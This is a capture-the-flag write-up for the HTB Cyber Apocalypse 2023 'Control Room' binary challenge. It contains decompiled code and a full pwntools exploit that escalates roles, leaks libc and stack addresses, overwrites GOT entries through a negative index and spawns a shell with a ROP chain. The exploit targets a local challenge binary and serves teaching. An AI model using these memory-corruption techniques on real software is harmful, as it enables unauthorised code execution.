## PWN CONTROL ROOM
### HTB - Cyber Apocalypse 2023


```
igio90@igio90-HP-ProBook-445-G7:~/projects/python/ctf/pwn_control_room$ ./control_room 

<===[ Register ]===>

Enter a username: gio

Are you sure about your username choice? (y/n)
> y
[+] User registered successfully.


┌───────────────┬────────┐
│ Control Panel │ 9A0:F3 │
├───────────────┴────────┤
│                        │
│ Technician:            │
│                        │
│ 1. Configure Engine    │
│                        │
│ 2. Check Engine        │
│                        │
│ Captain:               │
│                        │
│ 3. Set route           │
│                        │
│ 4. View route          │
│                        │
│ 5. Change roles        │
│                        │
└────────────────────────┘

[*] Current Role: Crew

Option [1-5]: 

```

```
igio90@igio90-HP-ProBook-445-G7:~/projects/python/ctf/pwn_control_room$ ./control_room 
<===[ Register ]===>

Enter a username: gio

Are you sure about your username choice? (y/n)
> n
<===[ Edit Username ]===>

New username size: 10
[!] Can't be larger than the current username.
```

---

### get captain role

overwrite the role with 0 (captain)

```java
  curr_user = (char *)malloc(272uLL);
  ...
  *((_DWORD *)curr_user + 64) = 2;  // initial role
```

```java
  printf("Enter a username: ");
  read_input(src, 256LL);
  strncpy(curr_user, src, 256uLL);
  *((_QWORD *)curr_user + 33) = strlen(curr_user) + 1;
```

```java
void user_edit()
{
  int n; // [rsp+4h] [rbp-Ch]
  void *s; // [rsp+8h] [rbp-8h]

  puts("<===[ Edit Username ]===>\n");
  printf("New username size: ");
  n = read_num();
  if ( *((_QWORD *)curr_user + 33) >= (unsigned __int64)n )
  {
    s = malloc(n + 1);
    if ( !s )
    {
      log_message(3LL, "Please replace the memory catridge.");
      exit(-1);
    }
    memset(s, 0, n + 1);
    printf("\nEnter your new username: ");
    fgets((char *)s, n, stdin);
    *((_BYTE *)s + strcspn((const char *)s, "\n")) = 0;
    strncpy(curr_user, (const char *)s, n + 1);
    log_message(0LL, "User updated successfully!\n");
    free(s);
  }
  else
  {
    log_message(3LL, "Can't be larger than the current username.\n");
  }
}
```

```py
from pwn import *
p = process('./control_room')

# get captain
p.sendline(b'A' * 256)
p.sendline('256')
p.recvuntil('new username: ')
p.sendline(b'B' * 254)

p.interactive()
```

```
igio90@igio90-HP-ProBook-445-G7:~/projects/python/ctf/pwn_control_room$ py main.py 
[+] Starting local process './control_room': pid 439249
[*] Switching to interactive mode
[+] User updated successfully!


┌───────────────┬────────┐
│ Control Panel │ 9A0:F3 │
├───────────────┴────────┤
│                        │
│ Technician:            │
│                        │
│ 1. Configure Engine    │
│                        │
│ 2. Check Engine        │
│                        │
│ Captain:               │
│                        │
│ 3. Set route           │
│                        │
│ 4. View route          │
│                        │
│ 5. Change roles        │
│                        │
└────────────────────────┘

[*] Current Role: Captain

Option [1-5]: $  
```

---

### leak libc and stack

```java
unsigned __int64 change_route()
{
  int i; // [rsp+Ch] [rbp-54h]
  __int64 v2[8]; // [rsp+10h] [rbp-50h] BYREF
  char s[2]; // [rsp+55h] [rbp-Bh] BYREF
  char v4; // [rsp+57h] [rbp-9h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_WORD *)s = 0;
  v4 = 0;
  if ( *((_DWORD *)curr_user + 64) )
  {
    log_message(3LL, "Only the captain is allowed to change the ship's route\n");
  }
  else
  {
    for ( i = 0; i <= 3; ++i )
    {
      printf("<===[ Coordinates [%d] ]===>\n", (unsigned int)(i + 1));
      printf("\tLatitude  : ");
      __isoc99_scanf("%ld", &v2[2 * i]);
      printf("\tLongitude : ");
      __isoc99_scanf("%ld", &v2[2 * i + 1]);
    }
    getchar();
    printf("\nDo you want to save the route? (y/n) ");
    printf("\n> ");
    fgets(s, 3, stdin);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "y") )
    {
      route = v2[0];
      qword_405168 = v2[1];
      qword_405170 = v2[2];
      qword_405178 = v2[3];
      qword_405180 = v2[4];
      qword_405188 = v2[5];
      qword_405190 = v2[6];
      qword_405198 = v2[7];
      log_message(0LL, "The route has been successfully updated!\n");
    }
    else
    {
      log_message(1LL, "Operation cancelled");
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

```python
from pwn import *

p = process('./control_room')

# get captain
p.sendline(b'A' * 256)
p.sendline('256')
p.recvuntil('new username: ')
p.sendline(b'B' * 254)

# leak libc and stack
p.recvuntil(']: ')
p.sendline('3')     #  menu - set route
p.send('\x00y\n')   #  null char + y for getchar() call + newline
p.clean(timeout=1)
p.sendline('4')     #  get route

p.interactive()
```

```
igio90@igio90-HP-ProBook-445-G7:~/projects/python/ctf/pwn_control_room$ py main.py 
[+] Starting local process './control_room': pid 440047
[*] Switching to interactive mode
<===[ Route ]===>
<===[ Coordinates [1] ]===>
    Latitude  : 140064534016064
    Longitude : 140064531428948
<===[ Coordinates [2] ]===>
    Latitude  : 0
    Longitude : 4199857
<===[ Coordinates [3] ]===>
    Latitude  : 43805310976
    Longitude : 7626264682497190656
<===[ Coordinates [4] ]===>
    Latitude  : 140729389357088
    Longitude : 4199934
```

---

### write

```java
unsigned __int64 configure_engine()
{
  _QWORD *v0; // rcx
  __int64 v1; // rdx
  int v3; // [rsp+Ch] [rbp-24h]
  __int64 v4; // [rsp+10h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-18h] BYREF
  char s[2]; // [rsp+25h] [rbp-Bh] BYREF
  char v7; // [rsp+27h] [rbp-9h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  *(_WORD *)s = 0;
  v7 = 0;
  if ( *((_DWORD *)curr_user + 64) == 1 )
  {
    printf("\nEngine number [0-%d]: ", 3LL);
    v3 = read_num();
    if ( v3 <= 3 )
    {
      printf("Engine [%d]: \n", (unsigned int)v3);
      printf("\tThrust: ");
      __isoc99_scanf("%ld", &v4);
      printf("\tMixture ratio: ");
      __isoc99_scanf("%ld", &v5);
    }
    getchar();
    printf("\nDo you want to save the configuration? (y/n) ");
    printf("\n> ");
    fgets(s, 3, stdin);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "y") )
    {
      v0 = (_QWORD *)((char *)&engines + 16 * v3);
      v1 = v5;
      *v0 = v4;
      v0[1] = v1;
      log_message(0LL, "Engine configuration updated successfully!\n");
    }
    else
    {
      log_message(1LL, "Engine configuration cancelled.\n");
    }
  }
  else
  {
    log_message(3LL, "Only technicians are allowed to configure the engines");
  }
  return __readfsqword(0x28u) ^ v8;
}
```

tldr; v3 allows for negative int

1) overwrite the ``exit`` call with function ``user_edit`` where there is ``strncpy`` writing in ``curr_user`` (see the code above)
2) overwrite ``strncpy`` with ``memcpy`` to avoid null byte termination in the rop
3) overwrite ``curr_user`` address with the stack address
4) send anything that is not a valid command (1-4) to trigger ``exit``
5) ``exit`` will jump to ``user_edit`` asking for the new username length (the rop length) which will be now checked against ``curr_user+33`` which already holds a value high enough to pass the first check in ``user_edit`` function.
6) send rop length followed by rop


```python
from pwn import *

p = process('./control_room')

# get captain
p.sendline(b'A' * 256)
p.sendline('256')
p.recvuntil('new username: ')
p.sendline(b'B' * 254)

# leak libc and stack
p.recvuntil(']: ')
p.sendline('3')
p.send('\x00y\n')
p.clean(timeout=1)
p.sendline('4')

data = p.recvuntil('Control Panel')
data = data.decode('utf8').split('\n')
data = list(filter(lambda x: ' : ' in x, data))
libc = 0
stack = 0
for i in range(8):
    val = int(data[i].split(' : ')[1])
    if i == 1:
        libc = val - 0x43654
        print('libc:', hex(libc))
    elif i == 6:
        stack = val
        print('stack:', hex(stack))


# change to technician role
p.sendline('5')
p.sendline('1')

# overwrite plt exit with user_edit
s = str(int(((0x4050b0 - 0x405120) / 16)))
p.sendline('1')
p.sendline(s)
p.sendline(str(0x4018ED))
p.sendline('1')
p.sendline('y')

# overwrite plt strncpy with memcpy
s = str(int(((0x405020 - 0x405120) / 16)))
p.sendline('1')
p.sendline(s)
p.sendline(str(libc + 0xc48f0))
p.sendline(str(libc + 0x80ed0))
p.sendline('y')

# overwrite curr_user with stack
s = str(int(((0x405100 - 0x405120) / 16)))
p.sendline('1')
p.sendline(s)
p.sendline(str(stack))
p.sendline('1')
p.sendline('y')

# send invalid command to trigger exit
p.sendline('0')

rop = p64(stack + 0x100)  # somewhere writable
rop += p64(libc + 0x00000000001303b2)  # pop rsi; ret;
rop += p64(0x0)
rop += p64(libc + 0x000000000011f497)  # pop rdx; pop r12; ret;
rop += p64(0x0)
rop += p64(0x0)
rop += p64(libc + 0xebcf8)
rop += b'\n'

# send rop
p.sendline(str(len(rop)))
p.send(rop)

p.clean(timeout=1)
p.interactive()
```

```
igio90@igio90-HP-ProBook-445-G7:~/projects/python/ctf/pwn_control_room$ py main.py 
[+] Starting local process './control_room': pid 439416
libc: 0x7ff606e00000
stack: 0x7ffe67290f30
[*] Switching to interactive mode
$ whoami
igio90
$ cat flag.txt
HTB{f4k3_fl4g_4_t35t1ng}
```